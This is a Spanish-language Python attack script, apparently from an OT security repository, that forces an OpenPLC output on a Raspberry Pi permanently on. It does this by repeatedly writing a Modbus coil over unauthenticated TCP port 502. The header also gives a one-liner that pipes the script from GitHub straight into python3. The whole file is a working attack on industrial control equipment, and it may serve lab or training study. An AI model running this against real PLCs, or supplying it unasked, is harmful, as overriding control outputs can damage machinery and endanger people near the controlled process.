#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para forzar el encendido de las salidas de OpenPLC en la Raspberry Pi
#
# Ejecución remota:
#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | python3 - 192.168.1.100 '%QX0.1'
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/ot-scripts/refs/heads/main/Ataques/Raspberry-GPIO-PLC-ForzarEncendidoDePin.py | nano -
#
# Es necesario instalar previamente el paquete: python3-pymodbus
#   sudo apt-get -y install python3-pymodbus
# ----------

import sys
import time
import socket
from pymodbus.client import ModbusTcpClient

# Función para comprobar si pymodbus está instalado
def check_pymodbus():
  try:
    import pymodbus
  except ImportError:
    print("\n Error: El paquete 'python3-pymodbus' no está instalado.\n")
    print("  Instálalo con: sudo apt install python3-pymodbus \n")
    sys.exit(1)

# Función para verificar si el puerto 502 de la Raspberry está abierto
def check_openplc(ip):
  try:
    with socket.create_connection((ip, 502), timeout=5):
      print(f"✅ OpenPLC está activo en {ip}.")
  except (socket.timeout, ConnectionRefusedError):
    print(f"\n  Error: El puerto 502 de {ip} no está escuchando conexiones Modbus.\n")
    print("  ¿Está OpenPLC activo en la Raspberry Pi?\n")
    sys.exit(1)

# Mapeo de pines OpenPLC a direcciones Modbus y a pines GPIO
pin_map = {
  "%QX0.0": 0,
  "%QX0.1": 1,
  "%QX0.2": 2,
  "%QX0.3": 3,
  "%QX0.4": 4,
  "%QX0.5": 5,
  "%QX0.6": 6,
  "%QX0.7": 7,
  "%QX1.0": 8,
  "%QX1.1": 9,
  "%QX1.2": 10
}

# Mapeo de pines OpenPLC a pines físicos de la Raspberry Pi
gpio_map = {
  "%QX0.0": 14,
  "%QX0.1": 15,
  "%QX0.2": 23,
  "%QX0.3": 24,
  "%QX0.4": 25,
  "%QX0.5": 8,
  "%QX0.6": 7,
  "%QX0.7": 12,
  "%QX1.0": 16,
  "%QX1.1": 20,
  "%QX1.2": 21
}

def activate_coil(ip, pin):
  if pin not in pin_map:
    print(f"Error: Pin {pin} no es válido. Usa uno de los siguientes: {', '.join(pin_map.keys())}")
    sys.exit(1)

  coil_address = pin_map[pin]  # Obtener dirección Modbus de la bobina
  gpio_pin = gpio_map.get(pin, "Desconocido")
  client = ModbusTcpClient(ip, port=502)

  try:
    while True:
      client.write_coil(coil_address, True)
      print(f"Bobina {pin} (Dirección {coil_address}) activada. Pin GPIO correspondiente: {gpio_pin}")
      time.sleep(1)  # Intervalo de envío
  except KeyboardInterrupt:
    print("\nInterrumpido por el usuario. Cerrando conexión...")
  finally:
    client.close()

if __name__ == "__main__":
  if len(sys.argv) != 3:
    print("\n Uso: python script.py <IP_Raspberry> <PIN>")
    print("\n Ejemplo: python script.py 192.168.1.100 %QX0.1")
    sys.exit(1)

  raspberry_ip = sys.argv[1]
  selected_pin = sys.argv[2]

  # Verificar dependencias antes de continuar
  check_pymodbus()
  check_openplc(raspberry_ip)

  activate_coil(raspberry_ip, selected_pin)
